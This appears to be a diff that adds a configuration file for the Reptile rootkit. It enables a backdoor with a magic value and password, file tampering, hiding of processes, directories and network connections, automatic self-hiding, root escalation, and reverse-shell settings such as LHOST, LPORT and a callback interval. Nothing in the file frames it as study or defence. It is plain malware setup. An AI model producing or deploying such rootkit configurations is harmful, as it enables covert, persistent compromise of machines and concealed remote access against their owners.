@@ -1,0 +1,33 @@
+# Reptile Configuration File
+
+# Backdoor configuration
+CONFIG_BACKDOOR=y
+MAGIC_VALUE="hax0r"
+PASSWORD="s3cr3t"
+SRCPORT=666
+
+# File tampering configuration
+CONFIG_FILE_TAMPERING=y
+TAG_NAME="reptile"
+
+# Process hiding configuration
+CONFIG_HIDE_PROC=y
+
+# Directory hiding configuration
+CONFIG_HIDE_DIR=y
+HIDE="reptile"
+
+# Connection hiding configuration
+CONFIG_HIDE_CONN=y
+
+# Auto hide configuration
+CONFIG_AUTO_HIDE=y
+
+# Give root configuration
+CONFIG_GIVE_ROOT=y
+
+# Reverse shell configuration
+CONFIG_RSHELL_ON_START=n
+LHOST="127.0.0.1"
+LPORT="4444"
+INTERVAL="1800"
